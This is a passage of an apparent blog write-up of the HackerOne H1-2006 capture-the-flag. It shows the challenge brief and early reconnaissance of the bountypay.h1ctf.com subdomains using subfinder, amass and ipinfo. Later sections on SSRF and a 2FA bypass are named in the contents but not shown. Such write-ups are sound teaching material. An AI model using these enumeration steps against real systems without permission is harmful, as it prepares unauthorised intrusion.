
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more.">
      
      
      
        <link rel="canonical" href="https://www.techbrunch.fr/blog/h1-2006-ctf---writeup/">
      
      
      
        <link rel="next" href="../google-vrp-teaser/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.37">
    
    
      
        <title>H1-2006 CTF - WriteUp - Today I Learned</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.8c3ca2c6.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        
        <link rel="stylesheet" href="../../assets/external/fonts.googleapis.com/css.49ea35f2.css">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="H1-2006 CTF - WriteUp - Today I Learned" >
      
        <meta  property="og:description"  content="The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more." >
      
        <meta  property="og:image"  content="https://www.techbrunch.fr/assets/images/social/blog/posts/h12006-ctf-writeup.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://www.techbrunch.fr/blog/h1-2006-ctf---writeup/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="H1-2006 CTF - WriteUp - Today I Learned" >
      
        <meta  name="twitter:description"  content="The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more." >
      
        <meta  name="twitter:image"  content="https://www.techbrunch.fr/assets/images/social/blog/posts/h12006-ctf-writeup.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#h1-2006-ctf-writeup" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
        <aside class="md-banner">
          <div class="md-banner__inner md-grid md-typeset">
            
              <button class="md-banner__button md-icon" aria-label="Don't show this again">
                
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
              </button>
            
            
  <a href="https://twitter.com/techbrunchfr">
    For updates follow <strong>@techbrunchfr</strong> on
    <span class="twemoji twitter">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
    </span>
    <strong>Twitter</strong>
  </a>

          </div>
          
            <script>var el=document.querySelector("[data-md-component=announce]");if(el){var content=el.querySelector(".md-typeset");__md_hash(content.innerHTML)===__md_get("__announce")&&(el.hidden=!0)}</script>
          
        </aside>
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Today I Learned" class="md-header__button md-logo" aria-label="Today I Learned" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Today I Learned
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              H1-2006 CTF - WriteUp
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
                
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Today I Learned" class="md-nav__button md-logo" aria-label="Today I Learned" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Today I Learned
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
        
          
          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Blog
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Blog
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      <a href="../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blog
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" >
        
          
          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Archive
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_2">
            <span class="md-nav__icon md-icon"></span>
            Archive
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../archive/2022/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../archive/2020/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2020
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
        
          
          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Categories
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_3">
            <span class="md-nav__icon md-icon"></span>
            Categories
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../category/writeup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WriteUp
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
                
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#passive-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Passive Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Passive Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#subdomain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomain Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mapping" class="md-nav__link">
    <span class="md-ellipsis">
      Mapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bountypayh1ctfcom" class="md-nav__link">
    <span class="md-ellipsis">
      bountypay.h1ctf.com
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#twitter" class="md-nav__link">
    <span class="md-ellipsis">
      Twitter
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appbountypayh1ctfcom" class="md-nav__link">
    <span class="md-ellipsis">
      app.bountypay.h1ctf.com
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#apibountypayh1ctfcom" class="md-nav__link">
    <span class="md-ellipsis">
      api.bountypay.h1ctf.com
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#staffbountypayh1ctfcom" class="md-nav__link">
    <span class="md-ellipsis">
      staff.bountypay.h1ctf.com
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#softwarebountypayh1ctfcom" class="md-nav__link">
    <span class="md-ellipsis">
      software.bountypay.h1ctf.com
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Active Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Directory Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#souce-code-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Souce code analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypassing-2fa" class="md-nav__link">
    <span class="md-ellipsis">
      Bypassing 2FA
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#server-side-request-forgery" class="md-nav__link">
    <span class="md-ellipsis">
      Server Side Request Forgery
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#android-reverse-engineering" class="md-nav__link">
    <span class="md-ellipsis">
      Android Reverse Engineering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Android Reverse Engineering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#partoneactivity" class="md-nav__link">
    <span class="md-ellipsis">
      PartOneActivity
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parttwoactivity" class="md-nav__link">
    <span class="md-ellipsis">
      PartTwoActivity
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#partthreeactivity" class="md-nav__link">
    <span class="md-ellipsis">
      PartThreeActivity
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#know-your-staff" class="md-nav__link">
    <span class="md-ellipsis">
      Know your staff
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Know your staff">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#getting-an-account-on-staffbountypay" class="md-nav__link">
    <span class="md-ellipsis">
      Getting an account on staff.bountypay
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-marten-mickos-account" class="md-nav__link">
    <span class="md-ellipsis">
      Getting Mårten Mickos account
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#you-will-pay-for-this" class="md-nav__link">
    <span class="md-ellipsis">
      You will pay for this !
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
  <div class="md-content md-content--post" data-md-component="content">
    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
      <div class="md-sidebar__scrollwrap">
        <div class="md-sidebar__inner md-post">
          <nav class="md-nav md-nav--primary">
            <div class="md-post__back">
              <div class="md-nav__title md-nav__container">
                <a href="../" class="md-nav__link">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
                  <span class="md-ellipsis">
                    Back to index
                  </span>
                </a>
              </div>
            </div>
            
              <div class="md-post__authors md-typeset">
                
                  <div class="md-profile md-post__profile">
                    <span class="md-author md-author--long">
                      <img src="../../assets/external/github.com/Techbrunch.png.jpg" alt="Aloïs Thévenot">
                    </span>
                    <span class="md-profile__description">
                      <strong>
                        
                          Aloïs Thévenot
                        
                      </strong>
                      <br>
                      Pentester
                    </span>
                  </div>
                
              </div>
            
            <ul class="md-post__meta md-nav__list">
              <li class="md-nav__item md-nav__item--section">
                <div class="md-post__title">
                  <span class="md-ellipsis">
                    Metadata
                  </span>
                </div>
                <nav class="md-nav">
                  <ul class="md-nav__list">
                    <li class="md-nav__item">
                      <div class="md-nav__link">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
                        <time datetime="2020-05-29 00:00:00" class="md-ellipsis">May 29, 2020</time>
                      </div>
                    </li>
                    
                    
                      <li class="md-nav__item">
                        <div class="md-nav__link">
                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
                          <span class="md-ellipsis">
                            in
                            
                              <a href="../category/writeup/">WriteUp</a></span>
                        </div>
                      </li>
                    
                    
                      
                      <li class="md-nav__item">
                        <div class="md-nav__link">
                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
                          <span class="md-ellipsis">
                            
                              31 min read
                            
                          </span>
                        </div>
                      </li>
                    
                  </ul>
                </nav>
              </li>
            </ul>
          </nav>
          
        </div>
      </div>
    </div>
    <article class="md-content__inner md-typeset">
      
        
  
  

<nav class="md-tags" >
  
    
    
    
      <span class="md-tag">CTF</span>
    
  
</nav>



<h1 id="h1-2006-ctf-writeup">H1-2006 CTF - WriteUp<a class="headerlink" href="#h1-2006-ctf-writeup" title="Permanent link">&para;</a></h1>
<p>The complete writeup for the H1-2006 CTF, including SSRF, Android Reverse Engineering, CSS injection and more.</p>
<!-- more -->

<blockquote>
<p>We need your help! CEO @martenmickos needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us?</p>
</blockquote>
<p><img alt="https://twitter.com/Hacker0x01/status/1266454022124376064" loading="lazy" src="../h12006-ctf-writeup/h12006.jpg" /></p>
<h2 id="passive-reconnaissance">Passive Reconnaissance<a class="headerlink" href="#passive-reconnaissance" title="Permanent link">&para;</a></h2>
<h3 id="subdomain-enumeration">Subdomain Enumeration<a class="headerlink" href="#subdomain-enumeration" title="Permanent link">&para;</a></h3>
<p>Let's start with some recon. The information we have so far is that <a href="https://twitter.com/martenmickos">@martenmickos</a> has has lost his login details for BountyPay and thus can't approve the May bug bounty payments. We also have the scope which is <strong>*.bountypay.h1ctf.com</strong></p>
<p>Usually when I approach a target I'll begin with some subdomain reconnaiscance. I have a couple of aliases in my <code>~/.zshrc</code> to use <a href="https://github.com/projectdiscovery/subfinder">subfinder</a> and <a href="https://github.com/OWASP/Amass">amass</a>. I run subfinder then amass:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>alias subff=&quot;subfinder -o subfinder.txt -v -d&quot;
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>alias amasss=&quot;amass enum -config ~/amass/config.ini -ip -src -nf subfinder.txt -d&quot;
</code></pre></div>
<p>Amass results:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>[Censys]          www.bountypay.h1ctf.com 3.21.98.146
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>[DNS]             bountypay.h1ctf.com 3.21.98.146
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>[Censys]          api.bountypay.h1ctf.com 3.21.98.146
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>[Censys]          app.bountypay.h1ctf.com 3.21.98.146
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>[Censys]          staff.bountypay.h1ctf.com 3.21.98.146
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>[Censys]          software.bountypay.h1ctf.com 3.21.98.146
</code></pre></div>
<p>We can see that everything is running on the same IP <a href="https://censys.io/ipv4/3.21.98.146">3.21.98.146</a>. Something that is often useful is to get basic info about the IP. For this I have a small function in my <code>~/.zshrc:</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ipinfo<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>http<span class="w"> </span>get<span class="w"> </span>https://ipinfo.io/<span class="nv">$1</span><span class="w"> </span>-b
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="o">}</span>
</code></pre></div>
<p>In this case we can see that the IP belongs to Amazon which could be useful if we encounter a SSRF later on:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">{</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="nt">&quot;city&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Columbus&quot;</span><span class="p">,</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="nt">&quot;country&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;US&quot;</span><span class="p">,</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="nt">&quot;hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ec2-3-21-98-146.us-east-2.compute.amazonaws.com&quot;</span><span class="p">,</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="nt">&quot;ip&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;3.21.98.146&quot;</span><span class="p">,</span>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="nt">&quot;loc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;40.1357,-83.0076&quot;</span><span class="p">,</span>
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="nt">&quot;org&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AS16509 Amazon.com, Inc.&quot;</span><span class="p">,</span>
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span><span class="nt">&quot;postal&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;43236&quot;</span><span class="p">,</span>
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="nt">&quot;readme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://ipinfo.io/missingauth&quot;</span><span class="p">,</span>
<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">    </span><span class="nt">&quot;region&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Ohio&quot;</span><span class="p">,</span>
<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">    </span><span class="nt">&quot;timezone&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;America/New_York&quot;</span>
<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="p">}</span>
</code></pre></div>
<h3 id="mapping">Mapping<a class="headerlink" href="#mapping" title="Permanent link">&para;</a></h3>
<p>I usually follow up with some visual recon using <a href="https://github.com/michenriksen/aquatone">Aquatone</a>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>aqua=&#39;cat amass.txt | aquatone -ports xlarge&#39;
</code></pre></div>
<p>Here I skipped Aquatone since it appears that we only have 5 targets:</p>
<ul>
<li>bountypay.h1ctf.com / www.bountypay.h1ctf.com</li>
<li>api.bountypay.h1ctf.com</li>
<li>app.bountypay.h1ctf.com</li>
<li>staff.bountypay.h1ctf.com</li>
<li>software.bountypay.h1ctf.com</li>
</ul>
<h3 id="bountypayh1ctfcom">bountypay.h1ctf.com<a class="headerlink" href="#bountypayh1ctfcom" title="Permanent link">&para;</a></h3>
<p><img alt="bountypay.h1ctf.com" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2009.19.48.png" /></p>
<p>bountypay.h1ctf.com has a dropdown menu that redirects to:</p>
<ul>
<li>Customers - app.bountypay.h1ctf.com</li>
<li>Staff - staff.bountypay.h1ctf.com</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
